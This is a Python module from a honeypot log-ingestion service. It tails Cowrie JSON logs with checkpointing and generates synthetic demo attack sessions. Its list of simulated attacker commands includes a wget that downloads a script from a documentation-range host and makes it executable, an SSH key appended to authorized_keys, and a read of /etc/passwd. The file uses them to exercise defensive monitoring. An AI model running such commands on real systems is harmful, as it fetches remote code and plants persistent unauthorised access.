"""
Telemetry source interface.

Adding a new source (e.g. Syslog, Suricata EVE JSON, Zeek, Windows Event Logs, firewall):
  1. Subclass `LogSource`, set a unique `name` and `data_origin`.
  2. Implement `poll(db)` returning a `PollResult` of `NormalizedEvent`s (see schema.py).
     For JSON-lines files reuse `tailer.read_new_lines` + a record parser, exactly like
     `CowrieFileSource`.  Raise nothing: report problems via `PollResult.errors`.
  3. Register an instance in `build_sources()`.
The worker commits checkpoint offsets in the same transaction as the stored events,
so a crash never loses or duplicates records.

Only the Cowrie file source, the HTTP ingest API (routers/ingest.py) and the synthetic
generator are implemented; other sources are documented extension points.
"""
import datetime
import json
import logging
import random
import uuid
from dataclasses import dataclass, field
from typing import List

from sqlalchemy.orm import Session

from app.config import settings
from app.ingestion.cowrie import parse_cowrie_line
from app.ingestion.schema import NormalizedEvent, EventParseError
from app.ingestion import tailer

logger = logging.getLogger("cyvantis.ingestion")


@dataclass
class PollResult:
    events: List[NormalizedEvent] = field(default_factory=list)
    rejected: int = 0
    errors: List[str] = field(default_factory=list)
    checkpoint: object = None  # IngestionCheckpoint to update after a successful commit


class LogSource:
    name = "base"
    data_origin = "real"

    def poll(self, db: Session) -> PollResult:  # pragma: no cover - interface
        raise NotImplementedError


class CowrieFileSource(LogSource):
    data_origin = "real"

    def __init__(self, path: str, name: str = "cowrie:file", data_origin: str = "real"):
        self.path = path
        self.name = name
        self.data_origin = data_origin  # "replayed" when importing an archived log

    def poll(self, db: Session) -> PollResult:
        cp = tailer.get_checkpoint(db, self.name, self.path)
        res = tailer.read_new_lines(cp, self.path, settings.INGEST_MAX_LINES_PER_CYCLE, settings.INGEST_MAX_LINE_BYTES)
        out = PollResult(checkpoint=cp, rejected=res.oversized)
        cp.status = res.status
        cp.last_error = res.error or None
        if res.rotated:
            logger.info("Log rotation/truncation detected for %s; restarting at offset 0", self.name)
        for offset, line in res.lines:
            try:
                out.events.append(parse_cowrie_line(line, source_ref=f"{self.name}@{offset}", data_origin=self.data_origin))
            except EventParseError as exc:
                out.rejected += 1
                if len(out.errors) < 20:
                    out.errors.append(f"offset {offset}: {exc}")
        if out.errors:
            logger.warning("%s rejected %d record(s); first: %s", self.name, out.rejected, out.errors[0])
        return out


# --------------------------------------------------------------------------------------
# Synthetic telemetry (demo mode). Every event is marked data_origin="simulated".
# Attackers use RFC 5737 documentation addresses so they can never be confused with real IPs.
# --------------------------------------------------------------------------------------
SYNTH_ATTACKERS = ["192.0.2.10", "192.0.2.44", "198.51.100.23", "198.51.100.77", "203.0.113.5", "203.0.113.150"]
SYNTH_USERS = ["root", "admin", "ubuntu", "oracle", "test", "pi"]
SYNTH_PASSWORDS = ["123456", "admin", "password", "toor", "raspberry", "qwerty"]
SYNTH_COMMANDS = ["uname -a", "whoami", "cat /proc/cpuinfo", "cat /etc/passwd", "ls -la /tmp",
                  "wget http://203.0.113.200/x.sh -O /tmp/x.sh && chmod +x /tmp/x.sh",
                  "echo 'ssh-rsa AAAA...demo' >> ~/.ssh/authorized_keys", "sudo -l", "crontab -l"]
SYNTH_SENSOR = "demo-sensor-01"
SYNTH_DST = "10.0.0.5"
SYNTH_HASH = "0" * 63 + "1"  # obviously synthetic sha256


class SyntheticSource(LogSource):
    """Generates small, coherent attack sessions (connect -> brute force -> login -> commands)."""
    name = "synthetic:demo"
    data_origin = "simulated"

    def __init__(self, rng: random.Random = None):
        self.rng = rng or random.Random()
        self._queue: List[dict] = []

    def _new_session(self):
        r = self.rng
        ip = r.choice(SYNTH_ATTACKERS)
        sess = uuid.uuid4().hex[:12]
        proto, port = r.choice([("ssh", 22), ("ssh", 22), ("telnet", 23)])
        base = {"src_ip": ip, "session": sess, "protocol": proto, "dst_port": port, "dst_ip": SYNTH_DST, "sensor": SYNTH_SENSOR}
        recs = [dict(base, eventid="cowrie.session.connect")]
        for _ in range(r.randint(1, 8)):
            recs.append(dict(base, eventid="cowrie.login.failed", username=r.choice(SYNTH_USERS), password=r.choice(SYNTH_PASSWORDS)))
        if r.random() < 0.35:
            recs.append(dict(base, eventid="cowrie.login.success", username="root", password=r.choice(SYNTH_PASSWORDS)))
            for cmd in r.sample(SYNTH_COMMANDS, r.randint(1, 4)):
                recs.append(dict(base, eventid="cowrie.command.input", input=cmd))
                if "wget" in cmd:
                    recs.append(dict(base, eventid="cowrie.session.file_download", url="http://203.0.113.200/x.sh", shasum=SYNTH_HASH))
        recs.append(dict(base, eventid="cowrie.session.closed", duration=round(r.uniform(1, 60), 1)))
        self._queue.extend(recs)

    def poll(self, db: Session) -> PollResult:
        out = PollResult()
        if not self._queue:
            self._new_session()
        # Emit a few records per cycle to look like a stream
        for _ in range(min(len(self._queue), self.rng.randint(1, 3))):
            rec = self._queue.pop(0)
            rec["timestamp"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
            rec["uuid"] = uuid.uuid4().hex
            try:
                ev = parse_cowrie_line(json.dumps(rec), data_origin="simulated")
                ev.source = "synthetic"
                out.events.append(ev)
            except EventParseError as exc:
                out.rejected += 1
                out.errors.append(str(exc))
        return out


def build_sources() -> List[LogSource]:
    sources: List[LogSource] = [CowrieFileSource(settings.COWRIE_LOG_PATH)]
    if settings.SIMULATION_MODE:
        sources.append(SyntheticSource())
    return sources
